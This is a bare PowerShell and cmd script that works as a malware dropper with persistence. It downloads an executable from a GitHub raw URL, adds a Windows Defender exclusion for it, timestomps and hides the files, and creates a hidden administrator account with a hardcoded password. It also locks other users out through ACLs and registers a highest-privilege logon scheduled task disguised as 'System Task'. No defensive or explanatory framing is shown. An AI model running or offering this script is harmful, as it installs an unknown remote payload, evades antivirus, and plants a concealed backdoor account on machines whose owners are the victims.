New-Item -ItemType Directory -Path C:\Users\Public\krnl

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl-debug.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl-debug.exe"

Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name CreationTime -Value (Get-Date "2024-12-13 14:23:08")

Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:24:58")

Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name CreationTime -Value (Get-Date "2024-12-13 14:24:57")

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden



net user krnlrunner "1234ggA" /add /y

net localgroup Administrators krnlrunner /add

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f

attrib +s +h "C:\Users\Public\krnl\schvostkrnl-debug.exe"

icacls "C:\Users\Public\krnl" /inheritance:r

icacls "C:\Users\Public\krnl" /remove "Users"

icacls "C:\Users\Public\krnl" /remove "Everyone"

icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"


Register-ScheduledTask -TaskName "WINschvostkrnl" `
  -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start C:\Users\Public\krnl\schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") `
  -Trigger (New-ScheduledTaskTrigger -AtLogon) `
  -Principal (New-ScheduledTaskPrincipal -UserId "krnlrunner" -LogonType Password -RunLevel Highest) `
  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) `
  -Description "System Task" -Force
